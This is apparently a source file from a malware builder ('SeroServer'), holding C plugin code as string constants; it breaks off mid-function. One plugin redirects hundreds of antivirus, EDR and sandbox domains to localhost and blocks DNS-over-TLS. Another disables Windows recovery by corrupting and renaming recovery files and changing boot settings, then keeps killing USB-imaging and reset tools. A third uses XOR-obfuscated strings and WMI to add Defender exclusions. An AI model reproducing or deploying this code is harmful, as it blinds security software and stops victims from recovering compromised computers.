namespace SeroServer.Builder;

internal static class PluginSources
{
    internal const string BlockAvDns = """
// Blocks AV cloud connectivity by redirecting their update/telemetry domains to 127.0.0.1
// via the hosts file. Covers Defender, Avast, Kaspersky, ESET, Malwarebytes, Bitdefender,
// Norton, McAfee, Sophos, Trend Micro, CrowdStrike, SentinelOne, RAV Endpoint Security, and more.
// Flushes DNS cache via dnsapi.dll so changes take effect immediately.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static int _Len(const char* s){int n=0;while(s[n])n++;return n;}

static const char* s_domains[]={
    // Avast — website + updates + cloud
    "avast.com","www.avast.com","forum.avast.com",
    "update.avast.com","ipm-provider.ff.avast.com",
    "v10.vir.avast.com","v10-rt.vir.avast.com",
    "ip-info.ff.avast.com","data-safe.ff.avast.com",
    // AVG
    "avg.com","www.avg.com",
    "update.avg.com","avgupdate.avg.com",
    // Kaspersky
    "kaspersky.com","www.kaspersky.com",
    "products.kaspersky-labs.com","avcerts.kaspersky-labs.com",
    "downloads1.kaspersky-labs.com","downloads2.kaspersky-labs.com",
    "dnl-01.geo.kaspersky.com","dnl-02.geo.kaspersky.com",
    // ESET
    "eset.com","www.eset.com",
    "update.eset.com","edf.eset.com","download.eset.com",
    // Malwarebytes
    "malwarebytes.com","www.malwarebytes.com",
    "data-cdn.mbamupdates.com","downloads.malwarebytes.com",
    "telemetry.malwarebytes.com",
    // Bitdefender
    "bitdefender.com","www.bitdefender.com",
    "upgrade.bitdefender.com","nimbus.bitdefender.net",
    "cloud.bitdefender.com","update.bitdefender.com",
    // Norton / Symantec / Broadcom
    "norton.com","www.norton.com",
    "symantec.com","www.symantec.com",
    "liveupdate.symantecliveupdate.com","liveupdate.symantec.com",
    "liveupdate209.symantec.com","updates.symantec.com",
    // McAfee / Trellix
    "mcafee.com","www.mcafee.com",
    "trellix.com","www.trellix.com",
    "update.nai.com","download.nai.com",
    "transfer.mcafee.com","vstskmgr.mcafee.com",
    // Sophos
    "sophos.com","www.sophos.com",
    "dets.sophos.com","dets2.sophos.com",
    "aus.sophos.com","sdds.sophos.com",
    // Trend Micro
    "trendmicro.com","www.trendmicro.com",
    "update.activeupdate.trendmicro.com","au.trendmicro.com",
    "housecall.trendmicro.com",
    // CrowdStrike
    "crowdstrike.com","www.crowdstrike.com",
    "ts01-b.cloudsink.net","lfodown01-b.cloudsink.net",
    // SentinelOne
    "sentinelone.com","www.sentinelone.com",
    "assets.sentinelone.com","psc.sentinelone.net",
    // G Data
    "gdata.de","www.gdata.de","update.gdata.de",
    // Emsisoft
    "emsisoft.com","www.emsisoft.com",
    "emit.emsisoft.com","cdn.emsisoft.com",
    // Webroot
    "webroot.com","www.webroot.com",
    "store.webroot.com","updates.brightcloud.com",
    // F-Secure / WithSecure
    "f-secure.com","www.f-secure.com",
    "withsecure.com","www.withsecure.com",
    "download.f-secure.com","update.f-secure.com",
    // Comodo
    "comodo.com","www.comodo.com",
    "download.comodo.com","updates.comodo.com",
    // VIPRE / Cylance / BlackBerry
    "vipre.com","www.vipre.com","update.vipre.com",
    "cylance.com","www.cylance.com",
    // Panda / WatchGuard
    "pandasecurity.com","www.pandasecurity.com",
    // RAV Endpoint Security (ReasonLabs)
    "ravantivirus.com","www.ravantivirus.com",
    "update.ravantivirus.com","cdn.ravantivirus.com",
    "download.ravantivirus.com","secure.ravantivirus.com",
    "api.ravantivirus.com","telemetry.ravantivirus.com",
    // Avira
    "avira.com","www.avira.com","update.avira.com","install.avira.com",
    "update3.avira.com","prodinfo.avira.com","a2updates.avira.com",
    "avira-update.com","updates.avira.com","downloads.avira.com",
    // Palo Alto Networks / Cortex XDR
    "paloaltonetworks.com","www.paloaltonetworks.com","cortex.paloaltonetworks.com",
    "wildfire.paloaltonetworks.com","xdr.us.paloaltonetworks.com",
    "autofocus.paloaltonetworks.com","threatvault.paloaltonetworks.com",
    "updates.paloaltonetworks.com","dl.paloaltonetworks.com",
    // Carbon Black / VMware / Broadcom
    "carbonblack.com","www.carbonblack.com","cbdynamiccloud.com",
    "defense.conferdeploy.net","api.conferdeploy.net","api2.conferdeploy.net",
    "api6.conferdeploy.net","dashboard.confer.net","cbhelpdesk.carbonblack.com",
    // Fortinet / FortiGuard
    "fortinet.com","www.fortinet.com","fortiguard.com","update.fortiguard.com",
    "guard.fortinet.com","services.fortiguard.net","fortisandbox.net",
    "download.fortiguard.com","support.fortinet.com",
    // Cisco / AMP / Talos / Umbrella / Secure Endpoint
    "amp.cisco.com","api.amp.cisco.com","cloud-sa.amp.cisco.com",
    "mgmt.amp.cisco.com","intel.amp.cisco.com","intake.amp.cisco.com",
    "talos.cisco.com","talosintelligence.com","snort.org",
    "umbrella.cisco.com","api.umbrella.com","sig.umbrella.com",
    "opendns.com","www.opendns.com","updates.opendns.com",
    // Cybereason
    "cybereason.com","www.cybereason.com","sensor.cybereason.net",
    "a.cybereason.net","cloud.cybereason.net","reports.cybereason.net",
    // Deep Instinct
    "deepinstinct.com","cloud.deepinstinct.com","update.deepinstinct.com",
    // Acronis
    "acronis.com","dl.acronis.com","update2.acronis.com",
    "cloud.acronis.com","acloud.acronis.com","download.acronis.com",
    // Check Point
    "checkpoint.com","www.checkpoint.com","secureupdates.checkpoint.com",
    "updates.checkpoint.com","cws.checkpoint.com","ta.checkpoint.com",
    "threatcloud.checkpoint.com","download.checkpoint.com",
    // Zscaler
    "zscaler.com","www.zscaler.com","cloud.zscaler.com","api.zscaler.com",
    "zscloud.net","zscalertwo.net","zscalerthree.net","zscalerbeta.net",
    "zscalerone.net","zpa.zscaler.com","client.b.zscaler.com",
    // Qualys
    "qualys.com","cloud.qualys.com","platform1.qualys.com",
    "qagpublic.qg1.apps.qualys.com","sensors.qualys.com","gateway.qg1.apps.qualys.com",
    // Huntress
    "huntress.com","www.huntress.com","sensor.huntress.io",
    "update.huntress.io","analysis.huntress.io",
    // Cynet
    "cynet.com","www.cynet.com","cloud.cynet.com","sensor.cynet.com",
    // Dr.Web
    "drweb.com","www.drweb.com","update.drweb.com",
    "download.drweb.com","vms.drweb.com","cdn.drweb.com",
    // Qihoo 360 / 360 Total Security
    "360.cn","safe.360.cn","update.360.cn","down.360safe.com",
    "qhsafemain.360safe.com","360totalsecurity.com","update.360totalsecurity.com",
    "dl.360safe.com","sd.360.cn","hms.360.cn",
    // AhnLab / V3
    "ahnlab.com","www.ahnlab.com","update.ahnlab.com",
    "ais.ahnlab.com","global.ahnlab.com","v3.ahnlab.com",
    // Huorong (火绒 HuoRong)
    "huorong.cn","www.huorong.cn","update.huorong.cn","cloud.huorong.cn",
    // K7 Computing
    "k7computing.com","www.k7computing.com","update.k7computing.com","k7ucserver.com",
    // Tencent / TAV / PC Manager
    "s.tencent.com","s.tav.qq.com","uac.qq.com","virscan.org",
    "pcmgr.tencent.com","antivirus.tencent.com",
    // Jiangmin
    "jiangmin.com","www.jiangmin.com","update.jiangmin.com",
    // Rising (瑞星)
    "rising.com.cn","update.rising.com.cn","www.rising.com.cn","down.rising.com.cn",
    // Kingsoft / Duba (金山)
    "duba.net","www.duba.net","virus.kingsoft.com","update.kingsoft.com",
    "down.duba.net","ksc.kingsoft.com",
    // PC Matic / SuperShield
    "pcmatic.com","www.pcmatic.com","updates.pcmatic.com","go.pcmatic.com",
    // Heimdal Security
    "heimdalsecurity.com","www.heimdalsecurity.com","cloud.heimdalsecurity.com",
    "update.heimdalsecurity.com",
    // Intezer
    "intezer.com","analyze.intezer.com","api.intezer.com",
    // ThreatLocker
    "threatlocker.com","www.threatlocker.com","cloud.threatlocker.com",
    // Immunet (Cisco / ClamAV)
    "immunet.com","www.immunet.com","update.immunet.com","freshclam.clamav.net",
    "database.clamav.net","clamav.net","www.clamav.net",
    // eScan / MicroWorld
    "escanav.com","www.escanav.com","update.escanav.com","escanftp.mwti.net",
    "mwti.net","www.mwti.net",
    // Quick Heal / Seqrite
    "quickheal.com","www.quickheal.com","cloud.quickheal.com",
    "updates.quickheal.com","seqrite.com","www.seqrite.com",
    // Ikarus
    "ikarussecurity.com","www.ikarussecurity.com","update.ikarus.at",
    "download.ikarus.at",
    // nProtect (INCA Internet)
    "nprotect.com","www.nprotect.com","nprotect.inca.co.kr",
    "update.nprotect.com","inca.co.kr",
    // Ad-Aware / Adaware / Lavasoft
    "adaware.com","www.adaware.com","lavasoft.com","www.lavasoft.com",
    "updates.lavasoft.com","cdn.lavasoft.com",
    // Hauri / ViRobot
    "hauri.net","www.hauri.net","update.hauri.net","virobotnet.hauri.net",
    // NANO Antivirus
    "nanoav.ru","www.nanoav.ru","update.nanoav.ru",
    // SUPERAntiSpyware
    "superantispyware.com","www.superantispyware.com","updates.superantispyware.com",
    // Spybot / Safer-Networking
    "safer-networking.org","www.safer-networking.org","updates.spybot.info",
    // ByteDefense
    "bytedefense.com","www.bytedefense.com",
    // SecureAge / APEX
    "secureage.com","www.secureage.com","update.secureage.com",
    // Arcabit
    "arcabit.pl","www.arcabit.pl","update.arcabit.pl","arcabit.com",
    // VBA32 / VirusBlokAda
    "anti-virus.by","www.anti-virus.by","vba32.com","update.vba32.com",
    // Zillya!
    "zillya.com","www.zillya.com","download.zillya.com",
    // Cyberprotect / Total Defense
    "totaldefense.com","www.totaldefense.com","update.totaldefense.com",
    // Tanium
    "tanium.com","www.tanium.com","cloud.tanium.com","na-2.cloud.tanium.com",
    // Rapid7 / InsightAgent
    "rapid7.com","www.rapid7.com","insight.rapid7.com","us.api.insight.rapid7.com",
    "data.insight.rapid7.com","endpoint.insight.rapid7.com",
    // Tenable / Nessus
    "tenable.com","www.tenable.com","cloud.tenable.com","sensor.cloud.tenable.com",
    "plugins.nessus.org","downloads.nessus.org",
    // OpenText / Micro Focus (Carbonite/Webroot)
    "opentext.com","securitycloud.opentext.com","microfocus.com",
    // Trusteer / IBM Trusteer
    "trusteer.com","www.trusteer.com","ibmtrusteerpinpoint.com",
    // Darktrace
    "darktrace.com","www.darktrace.com","cloud.darktrace.com",
    // Secureworks / Taegis
    "secureworks.com","www.secureworks.com","cloud.secureworks.com",
    "api.secureworks.com","taegis.com","www.taegis.com",
    // BlackBerry / Cylance Guard / Protect
    "protect.cylance.com","my.cylance.com","data.cylance.com",
    "blackberrysecurity.com","www.blackberrysecurity.com",
    // Stairwell
    "stairwell.com","www.stairwell.com",
    // Intercept X / Sophos Central (extra domains)
    "central.sophos.com","api.central.sophos.com","cloud.sophos.com",
    // Cyberark / Endpoint Privilege
    "cyberark.com","www.cyberark.com","api.cyberark.com",
    // TrendMicro Vision One (extra)
    "trendmicro.com","vision-one.trendmicro.com","api.xdr.trendmicro.com",
    // VirusTotal (online scanning)
    "virustotal.com","www.virustotal.com","api.virustotal.com","support.virustotal.com",
    // ANY.RUN (sandbox)
    "any.run","api.any.run","app.any.run",
    // Hybrid Analysis (sandbox)
    "hybrid-analysis.com","www.hybrid-analysis.com",
    // Joe Sandbox
    "joesandbox.com","www.joesandbox.com","joeboxcontrol.com",
    // Metadefender / OPSWAT
    "metadefender.com","api.metadefender.com","opswat.com","www.opswat.com",
    // Cuckoo / Malwr
    "malwr.com","www.malwr.com",
    // Tria.ge (sandbox)
    "tria.ge","api.tria.ge",
    // MalwareBazaar / abuse.ch
    "bazaar.abuse.ch","malwarebazaar.abuse.ch","urlhaus.abuse.ch",
    NULL
};

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    // Build hosts file path
    wchar_t hostsPath[MAX_PATH]={};
    GetWindowsDirectoryW(hostsPath,MAX_PATH);
    lstrcatW(hostsPath,L"\\System32\\drivers\\etc\\hosts");

    HANDLE hf=CreateFileW(hostsPath,FILE_APPEND_DATA,FILE_SHARE_READ,NULL,
                          OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE)return FALSE;

    DWORD wr=0;
    const char* header="\r\n# AV update/telemetry block\r\n";
    WriteFile(hf,header,_Len(header),&wr,NULL);

    for(int i=0;s_domains[i];i++){
        char line[128]="127.0.0.1 ";
        int plen=_Len(line);
        const char* d=s_domains[i];
        int dl=_Len(d);
        for(int j=0;j<dl&&plen+j<126;j++)line[plen+j]=d[j];
        int total=plen+dl;
        line[total]='\r';line[total+1]='\n';
        WriteFile(hf,line,total+2,&wr,NULL);
    }
    CloseHandle(hf);

    // Flush DNS resolver cache so hosts file entries take effect immediately
    HMODULE hDns=LoadLibraryW(L"dnsapi.dll");
    if(hDns){
        typedef BOOL(WINAPI*fnFlush_t)();
        fnFlush_t fn=(fnFlush_t)GetProcAddress(hDns,"DnsFlushResolverCache");
        if(fn)fn();
        FreeLibrary(hDns);
    }

    // Block DNS-over-TLS port 853 outbound via netsh (no registry, no PowerShell)
    wchar_t sys[MAX_PATH]={};
    GetSystemDirectoryW(sys,MAX_PATH);
    wchar_t cmd[MAX_PATH*2]={};
    wsprintfW(cmd,
        L"%s\\netsh.exe advfirewall firewall add rule name=\"BlkDoT\" "
        L"dir=out action=block protocol=tcp remoteport=853 enable=yes",
        sys);
    STARTUPINFOW si={};PROCESS_INFORMATION pi={};si.cb=sizeof(si);
    if(CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi))
    {WaitForSingleObject(pi.hProcess,5000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}

    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
""";

    internal const string BlockReset = """
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>

static int _StrFind(const char* hay, DWORD hayLen, const char* needle){
    int nlen=0;while(needle[nlen])nlen++;
    if(nlen==0)return 0;
    for(DWORD i=0;i+(DWORD)nlen<=hayLen;i++){
        BOOL ok=TRUE;
        for(int j=0;j<nlen;j++)if(hay[i+j]!=needle[j]){ok=FALSE;break;}
        if(ok)return (int)i;
    }
    return -1;
}

static BOOL _PatchReAgentXml(void){
    wchar_t path[MAX_PATH]={};
    GetWindowsDirectoryW(path,MAX_PATH);
    lstrcatW(path,L"\\System32\\Recovery\\ReAgent.xml");

    HANDLE h=CreateFileW(path,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE)return FALSE;

    DWORD sz=GetFileSize(h,NULL);
    if(sz==0||sz>2*1024*1024){CloseHandle(h);return FALSE;}

    char* buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sz+4);
    if(!buf){CloseHandle(h);return FALSE;}

    DWORD rd=0;
    BOOL ok=ReadFile(h,buf,sz,&rd,NULL);
    if(!ok||rd==0){HeapFree(GetProcessHeap(),0,buf);CloseHandle(h);return FALSE;}

    BOOL modified=FALSE;
    int pos;
    while((pos=_StrFind(buf,rd,"WinReEnabled=\"1\""))>=0){
        buf[pos+14]='0';modified=TRUE;
    }
    while((pos=_StrFind(buf,rd,"WinREEnabled=\"1\""))>=0){
        buf[pos+14]='0';modified=TRUE;
    }
    while((pos=_StrFind(buf,rd,"WinReEnabled=\"true\""))>=0){
        buf[pos+14]='f';buf[pos+15]='a';buf[pos+16]='l';buf[pos+17]='s';buf[pos+18]='e';
        modified=TRUE;
    }
    // Corrupt the WinreLocation path so reagentc /enable cannot locate Winre.wim
    while((pos=_StrFind(buf,rd,"\\Recovery\\WindowsRE"))>=0){
        buf[pos+1]='_';buf[pos+2]='_';buf[pos+3]='x';buf[pos+4]='R';
        buf[pos+5]='e';buf[pos+6]='c';buf[pos+7]='_';buf[pos+8]='_';
        modified=TRUE;
    }

    if(modified){
        SetFilePointer(h,0,NULL,FILE_BEGIN);
        SetEndOfFile(h);
        DWORD wr=0;
        WriteFile(h,buf,rd,&wr,NULL);
    }

    HeapFree(GetProcessHeap(),0,buf);
    CloseHandle(h);

    // Lock the patched file as read-only+system so reagentc /enable cannot rewrite it
    if(modified)
        SetFileAttributesW(path,FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);

    return modified;
}

// Rename reagentc.exe so it cannot be run by name to re-enable WinRE
static void _DisableReagentcExe(void){
    wchar_t src[MAX_PATH]={},dst[MAX_PATH]={};
    GetSystemDirectoryW(src,MAX_PATH);
    lstrcpyW(dst,src);
    lstrcatW(src,L"\\reagentc.exe");
    lstrcatW(dst,L"\\reagentc.exe.bak");
    // Only rename if original exists and backup doesn't
    if(GetFileAttributesW(src)!=INVALID_FILE_ATTRIBUTES &&
       GetFileAttributesW(dst)==INVALID_FILE_ATTRIBUTES)
        MoveFileW(src,dst);
}

// Rename Winre.wim so reagentc /enable can never find the WinRE image
static void _NukeWinreWim(void){
    wchar_t drives[]={L'C',L'D',L'E',L'F',L'G',0};
    for(int i=0;drives[i];i++){
        wchar_t path[MAX_PATH]={};
        path[0]=drives[i];path[1]=L':';
        lstrcatW(path,L"\\Recovery\\WindowsRE\\Winre.wim");
        if(GetFileAttributesW(path)!=INVALID_FILE_ATTRIBUTES){
            wchar_t dst[MAX_PATH]={};
            lstrcpyW(dst,path);
            DWORD dlen=(DWORD)lstrlenW(dst);
            if(dlen>3){dst[dlen-3]=L'b';dst[dlen-2]=L'a';dst[dlen-1]=L'k';}
            MoveFileW(path,dst);
        }
    }
    {
        wchar_t sysPath[MAX_PATH]={};
        GetWindowsDirectoryW(sysPath,MAX_PATH);
        lstrcatW(sysPath,L"\\System32\\Recovery\\Winre.wim");
        if(GetFileAttributesW(sysPath)!=INVALID_FILE_ATTRIBUTES){
            wchar_t dst[MAX_PATH]={};
            lstrcpyW(dst,sysPath);
            DWORD dlen=(DWORD)lstrlenW(dst);
            if(dlen>3){dst[dlen-3]=L'b';dst[dlen-2]=L'a';dst[dlen-1]=L'k';}
            MoveFileW(sysPath,dst);
        }
    }
}

static BOOL _RunSys32(const wchar_t* exe, const wchar_t* args, DWORD waitMs){
    wchar_t sys[MAX_PATH]={},cmd[MAX_PATH+256]={};
    GetSystemDirectoryW(sys,MAX_PATH);
    lstrcpyW(cmd,sys);lstrcatW(cmd,L"\\");lstrcatW(cmd,exe);
    lstrcatW(cmd,L" ");lstrcatW(cmd,args);
    STARTUPINFOW si={};PROCESS_INFORMATION pi={};si.cb=sizeof(si);
    BOOL r=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(r){WaitForSingleObject(pi.hProcess,waitMs);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return r;
}

static void _RunReagentc(void){
    _RunSys32(L"reagentc.exe",L"/disable",10000);
}

static void _DisableRecoveryBoot(void){
    _RunSys32(L"bcdedit.exe",L"/set {default} recoveryenabled No",8000);
    _RunSys32(L"bcdedit.exe",L"/set {default} bootstatuspolicy IgnoreAllFailures",8000);
    _RunSys32(L"bcdedit.exe",L"/set {bootmgr} displaybootmenu No",8000);
    _RunSys32(L"bcdedit.exe",L"/timeout 0",8000);
}

static BOOL _WNameEq(const wchar_t* a, const wchar_t* b){
    while(*a&&*b){
        wchar_t ca=*a,cb=*b;
        if(ca>='A'&&ca<='Z')ca+=32;
        if(cb>='A'&&cb<='Z')cb+=32;
        if(ca!=cb)return FALSE;
        a++;b++;
    }
    return *a==0&&*b==0;
}

static void _KillByNames(const wchar_t* const* names){
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap==INVALID_HANDLE_VALUE)return;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    if(Process32FirstW(snap,&pe)){
        do{
            for(int i=0;names[i];i++){
                if(_WNameEq(pe.szExeFile,names[i])){
                    HANDLE hp=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
                    if(hp){TerminateProcess(hp,0);CloseHandle(hp);}
                    break;
                }
            }
        }while(Process32NextW(snap,&pe));
    }
    CloseHandle(snap);
}

static const wchar_t* const _UsbTools[]={
    L"rufus.exe",L"balenaEtcher.exe",L"etcher.exe",L"etcherPro.exe",
    L"ultraiso.exe",L"imgburn.exe",L"unetbootin.exe",
    L"win32diskimager.exe",L"win32diskimager2.exe",
    L"linuxliveusb.exe",L"wintoflash.exe",L"yumi.exe",
    L"xboot.exe",L"sardu.exe",L"wubi.exe",L"usbwriter.exe",
    L"dd.exe",L"HxD.exe",
    L"rstrui.exe",L"recoverydrive.exe",L"ResetEngine.exe",
    L"systemreset.exe",L"WindowsUpdateBox.exe",
    NULL
};

static DWORD WINAPI _WatcherThread(LPVOID){
    // Pin this DLL so FreeLibrary from the caller cannot unload it while we run
    HMODULE hSelf=NULL;
    GetModuleHandleExW(0x00000001|0x00000004,(LPCWSTR)_WatcherThread,&hSelf);
    while(TRUE){
        _KillByNames(_UsbTools);
        Sleep(3000);
    }
    return 0;
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    _NukeWinreWim();
    _PatchReAgentXml();
    _RunReagentc();
    _DisableReagentcExe();
    _DisableRecoveryBoot();
    _KillByNames(_UsbTools);
    CreateThread(NULL,0,_WatcherThread,NULL,0,NULL);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
""";

    internal const string ExcludeDefender = """
#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM
#include <windows.h>
#include <tlhelp32.h>
#include <ole2.h>

#define _XK ((wchar_t)0xA5u)
#define _XW(c) ((wchar_t)((wchar_t)(c)^_XK))
static void _dw(const wchar_t* e,wchar_t* d,int max){int i=0;while(e[i]&&i<max-1){d[i]=(wchar_t)(e[i]^_XK);i++;}d[i]=0;}

static const wchar_t _e_ns[]={
    _XW(L'\\'),_XW(L'\\'),_XW(L'.'),_XW(L'\\'),
    _XW(L'r'),_XW(L'o'),_XW(L'o'),_XW(L't'),_XW(L'\\'),
    _XW(L'm'),_XW(L'i'),_XW(L'c'),_XW(L'r'),_XW(L'o'),_XW(L's'),_XW(L'o'),_XW(L'f'),_XW(L't'),_XW(L'\\'),
    _XW(L'w'),_XW(L'i'),_XW(L'n'),_XW(L'd'),_XW(L'o'),_XW(L'w'),_XW(L's'),_XW(L'\\'),
    _XW(L'd'),_XW(L'e'),_XW(L'f'),_XW(L'e'),_XW(L'n'),_XW(L'd'),_XW(L'e'),_XW(L'r'),0};
static const wchar_t _e_cls[]={
    _XW(L'M'),_XW(L'S'),_XW(L'F'),_XW(L'T'),_XW(L'_'),_XW(L'M'),_XW(L'p'),
    _XW(L'P'),_XW(L'r'),_XW(L'e'),_XW(L'f'),_XW(L'e'),_XW(L'r'),_XW(L'e'),_XW(L'n'),_XW(L'c'),_XW(L'e'),0};
static const wchar_t _e_add[]={_XW(L'A'),_XW(L'd'),_XW(L'd'),0};
static const wchar_t _e_ep[]={
    _XW(L'E'),_XW(L'x'),_XW(L'c'),_XW(L'l'),_XW(L'u'),_XW(L's'),_XW(L'i'),_XW(L'o'),_XW(L'n'),
    _XW(L'P'),_XW(L'a'),_XW(L't'),_XW(L'h'),0};
static const wchar_t _e_sedp[]={
    _XW(L'S'),_XW(L'e'),_XW(L'D'),_XW(L'e'),_XW(L'b'),_XW(L'u'),_XW(L'g'),
    _XW(L'P'),_XW(L'r'),_XW(L'i'),_XW(L'v'),_XW(L'i'),_XW(L'l'),_XW(L'e'),_XW(L'g'),_XW(L'e'),0};
static const wchar_t _e_seip[]={
    _XW(L'S'),_XW(L'e'),_XW(L'I'),_XW(L'm'),_XW(L'p'),_XW(L'e'),_XW(L'r'),_XW(L's'),_XW(L'o'),
    _XW(L'n'),_XW(L'a'),_XW(L't'),_XW(L'e'),_XW(L'P'),_XW(L'r'),_XW(L'i'),_XW(L'v'),_XW(L'i'),
    _XW(L'l'),_XW(L'e'),_XW(L'g'),_XW(L'e'),0};
static const wchar_t _e_wl[]={
    _XW(L'w'),_XW(L'i'),_XW(L'n'),_XW(L'l'),_XW(L'o'),_XW(L'g'),_XW(L'o'),_XW(L'n'),
    _XW(L'.'),_XW(L'e'),_XW(L'x'),_XW(L'e'),0};
static const wchar_t _e_cbs[]={_XW(L'C'),_XW(L':'),_XW(L'\\'),0};
static const wchar_t _e_rdll[]={
    _XW(L'\\'),_XW(L'r'),_XW(L'u'),_XW(L'n'),_XW(L'd'),_XW(L'l'),_XW(L'l'),_XW(L'3'),_XW(L'2'),
    _XW(L'.'),_XW(L'e'),_XW(L'x'),_XW(L'e'),_XW(L' '),_XW(L'"'),0};
static const wchar_t _e_em[]={
    _XW(L'"'),_XW(L','),_XW(L'E'),_XW(L'x'),_XW(L'c'),_XW(L'l'),_XW(L'u'),_XW(L'd'),_XW(L'e'),
    _XW(L'M'),_XW(L'a'),_XW(L'i'),_XW(L'n'),0};

static wchar_t g_dllPath[MAX_PATH] = {};

// ── WMI GUIDs (manual — no wbemcli.h needed) ─────────────────────────────────
static const CLSID  CLSID_WbemLocator_ = {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
static const IID    IID_IWbemLocator_  = {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};

// IWbemLocator vtable: ConnectServer at [3]
typedef HRESULT(__stdcall* fnConnectServer_t)(void*,const BSTR,const BSTR,const BSTR,const BSTR,LONG,const BSTR,void*,void**);
// IWbemServices: GetObject at [6], ExecMethod at [24]
typedef HRESULT(__stdcall* fnGetObject_t)(void*,const BSTR,LONG,void*,void**,void**);
typedef HRESULT(__stdcall* fnExecMethod_t)(void*,const BSTR,const BSTR,LONG,void*,void*,void**,void**);
// IWbemClassObject: Put at [5], SpawnInstance at [15], GetMethod at [19]
typedef HRESULT(__stdcall* fnPut_t)(void*,LPCWSTR,LONG,VARIANT*,LONG);
typedef HRESULT(__stdcall* fnSpawnInstance_t)(void*,LONG,void**);
typedef HRESULT(__stdcall* fnGetMethod_t)(void*,LPCWSTR,LONG,void**,void**);

static void* _Vtbl(void* p, int idx){ return (*(void***)p)[idx]; }

// Enable a named privilege on the current process token
static void _EnablePrivilege(const wchar_t* name){
    HANDLE hTok=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok))return;
    TOKEN_PRIVILEGES tp={};
    tp.PrivilegeCount=1;
    LookupPrivilegeValueW(NULL,name,&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(hTok);
}

// Pure WMI exclusion — runs under whatever identity the calling process has
static BOOL _WmiExclude(const wchar_t* excludePath){
    HRESULT hr=CoInitializeEx(NULL,COINIT_MULTITHREADED);
    BOOL coinit=(hr==S_OK||hr==S_FALSE);
    CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE,NULL);

    void* pLoc=NULL;
    hr=CoCreateInstance(CLSID_WbemLocator_,NULL,CLSCTX_INPROC_SERVER,IID_IWbemLocator_,&pLoc);
    if(FAILED(hr)){if(coinit)CoUninitialize();return FALSE;}

    wchar_t _d_ns[48];_dw(_e_ns,_d_ns,48);
    BSTR ns=SysAllocString(_d_ns);
    void* pSvc=NULL;
    hr=((fnConnectServer_t)_Vtbl(pLoc,3))(pLoc,ns,NULL,NULL,NULL,0,NULL,NULL,&pSvc);
    SysFreeString(ns);

    BOOL ok=FALSE;
    if(SUCCEEDED(hr)&&pSvc){
        CoSetProxyBlanket((IUnknown*)pSvc,RPC_C_AUTHN_WINNT,RPC_C_AUTHZ_NONE,NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE);

        wchar_t _d_cls[24];_dw(_e_cls,_d_cls,24);
        BSTR clsPath=SysAllocString(_d_cls);
        void* pCls=NULL;
        hr=((fnGetObject_t)_Vtbl(pSvc,6))(pSvc,clsPath,0,NULL,&pCls,NULL);
        SysFreeString(clsPath);

        if(SUCCEEDED(hr)&&pCls){
            void* pInSig=NULL;
            wchar_t _d_add[8];_dw(_e_add,_d_add,8);
            // GetMethod is at vtable index 19 (NOT 22 — 22 is BeginMethodEnumeration)
            hr=((fnGetMethod_t)_Vtbl(pCls,19))(pCls,_d_add,0,&pInSig,NULL);
            if(SUCCEEDED(hr)&&pInSig){
                void* pInst=NULL;
                hr=((fnSpawnInstance_t)_Vtbl(pInSig,15))(pInSig,0,&pInst);
                if(SUCCEEDED(hr)&&pInst){
                    SAFEARRAYBOUND sab={1,0};
                    SAFEARRAY* sa=SafeArrayCreate(VT_BSTR,1,&sab);
                    if(sa){
                        BSTR bPath=SysAllocString(excludePath);
                        LONG idx2=0;
                        SafeArrayPutElement(sa,&idx2,bPath);
                        SysFreeString(bPath);
                        wchar_t _d_ep[20];_dw(_e_ep,_d_ep,20);
                        VARIANT v={};v.vt=VT_BSTR|VT_ARRAY;v.parray=sa;
                        ((fnPut_t)_Vtbl(pInst,5))(pInst,_d_ep,0,&v,0);
                        SafeArrayDestroy(sa);
                    }
                    wchar_t _d_cls2[24];_dw(_e_cls,_d_cls2,24);
                    wchar_t _d_add2[8];_dw(_e_add,_d_add2,8);
                    BSTR methPath=SysAllocString(_d_cls2);
                    BSTR methName=SysAllocString(_d_add2);
                    hr=((fnExecMethod_t)_Vtbl(pSvc,24))(pSvc,methPath,methName,0,NULL,pInst,NULL,NULL);
                    SysFreeString(methPath);SysFreeString(methName);
                    ok=SUCCEEDED(hr);
                    ((IUnknown*)pInst)->Release();
                }
